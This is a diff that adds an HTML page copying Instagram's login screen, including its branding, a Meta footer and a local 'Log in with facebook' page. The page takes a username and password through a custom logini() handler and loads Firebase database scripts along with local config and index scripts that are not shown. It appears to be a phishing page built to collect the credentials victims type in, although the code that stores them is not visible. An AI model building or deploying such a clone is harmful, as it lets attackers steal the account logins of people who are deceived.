@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Login</title>
+    <link rel="stylesheet" type="text/css" href="./assets/instagramstyles.css">
+</head>
+<body>
+    <section id="main-section">
+        <div class="container">
+            <div class="img-content">
+                <img src="./assets/images/phones.png" alt="img here"/>
+            </div>
+            <div class="form-content">
+                <div class="form-container">
+                   <div class="logo">
+                    <img src="./assets/images/Subject_Guides__Citation_Style_Guide__Citing_Social_Media-removebg-preview.png" alt="img here"/>
+                   </div>
+                        <!-- Form (input) section -->
+                        <div class="input-container">
+                        <input class="email" aria-label="Phone Number, username or email" aria-required="true" placeholder="Phone Number, username or email" id="username"/>
+                        <input class="password" aria-label="Password" aria-required="true" placeholder="Password" id="password"/>
+                        <button class="login" onclick="logini()">Login</button>
+                    </div>
+
+                    <!--- Other sections -->
+                    <div class="or-div">
+                        <hr>
+                        <h3 class="or-text">OR</h3>
+                        <hr>
+                    </div>
+
+                    <!-- Sign with Facebook-->
+                    <a href="/facebook.html" style="text-decoration: none;">
+                    <div class="facebook-sign">
+                        <img src="./assets/images/icons8-facebook-30.png" alt="img here">
+                        <h2>Log in with facebook</h2>
+                    </div>
+                </a>
+
+                <!-- Forgotten password-->
+                
+                    <a href="#" class="forgotten">
+                        Forgotten Password?
+                    </a>
+                </div>
+
+                <!--Dont have an account-->
+                <div class="dhacct">
+                    <h2>Don't have an account?</h2>
+                    <a href="#">Sign up</a>
+                </div>
+
+                <!--Get the app-->
+                <h3 class="get-app-txt">Get the app</h3>
+                <div class="store-img">
+                    <div id="playstore">
+                        <img src="./assets/images/c5Rp7Ym-Klz.png" alt="img here"/>
+                    </div>
+                    <div id="microsoft">
+                        <img src="./assets/images/EHY6QnZYdNX.png" alt="img here"/>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <footer>
+        <div class="feature-links">
+            <ul>
+                <li><a href="#">Meta</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Blog</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Instagram Lite</a></li>
+                <li><a href="#">Threads</a></li>
+                <li><a href="#">Contact Uploading & Non Users </a></li>
+                <li><a href="#">Meta Verified</a></li>
+            </ul>
+        </div>
+        <h3 class="copyright">&copy; 2023 instagram from meta</h3>
+    </footer>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+            <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+          
+            <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+            <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+            <script src="./main/config.js"></script>
+<script src="./main/index.js"></script>
+</body>
+</html>
